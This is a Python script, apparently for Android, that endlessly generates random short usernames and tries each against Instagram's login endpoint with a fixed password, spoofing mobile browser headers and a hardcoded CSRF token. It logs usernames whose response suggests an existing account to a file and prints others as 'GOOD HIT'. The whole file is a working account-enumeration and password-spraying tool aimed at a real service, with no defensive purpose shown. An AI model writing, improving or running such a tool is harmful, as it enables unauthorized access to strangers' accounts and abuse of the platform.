import requests
import time
import random
import webbrowser


while True:
    current_time = int(time.time())  # time integer olarak alalım

    sin = "".join(random.choice('qwertyuiopasdfghjklzxcvbnm1234567890._') for i in range(random.randint(5,6)))
    pas = 'loiploip'

    url = "https://www.instagram.com/api/v1/web/accounts/login/ajax/"
    payload = f"enc_password=%23PWD_INSTAGRAM_BROWSER%3A0%3A{current_time}%3A{pas}&caaF2DebugGroup=0&loginAttemptSubmissionCount=0&optIntoOneTap=false&queryParams=%7B%7D&trustedDeviceRecords=%7B%7D&username={sin}"
    headers = {
        'User-Agent': "Mozilla/5.0 (Linux; Android 11; RMX2189 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/132.0.6834.122 Mobile Safari/537.36",
        'Accept-Encoding': "gzip, deflate, br, zstd",
        'Content-Type': "application/x-www-form-urlencoded",
        'sec-ch-ua-full-version-list': "\"Not A(Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"132.0.6834.122\", \"Android WebView\";v=\"132.0.6834.122\"",
        'sec-ch-ua-platform': "\"Android\"",
        'sec-ch-ua': "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\", \"Android WebView\";v=\"132\"",
        'sec-ch-ua-model': "\"RMX2189\"",
        'sec-ch-ua-mobile': "?1",
        'x-ig-app-id': "1217981644879628",
        'x-requested-with': "XMLHttpRequest",
        'x-instagram-ajax': "1019730916",
        'x-csrftoken': "XSwt-wWIqJ0Oke0O5vgGKf",
        'x-web-device-id': "22F38760-4EA6-415D-94EC-6988E880BC81",
        'x-web-session-id': ":fwm8n0:y2144c",
        'x-asbd-id': "129477",
        'sec-ch-prefers-color-scheme': "light",
        'x-ig-www-claim': "0",
        'sec-ch-ua-platform-version': "\"11.0.0\"",
        'origin': "https://www.instagram.com",
        'sec-fetch-site': "same-origin",
        'sec-fetch-mode': "cors",
        'sec-fetch-dest': "empty",
        'referer': "https://www.instagram.com/accounts/login/",
        'accept-language': "ar,ar-IQ;q=0.9,en-US;q=0.8,en;q=0.7",
        'priority': "u=1, i",
    }

    response = requests.post(url, data=payload, headers=headers).text

    if 'showAccountRecoveryModal' in response:
        # BAD kullanıcı
        with open('/storage/emulated/0/Download/Telegram/goduseris.txt', 'a') as file:
            file.write(sin + '\n')
        print('BAD :', sin)
    else:
        print('GOOD HIT:', sin)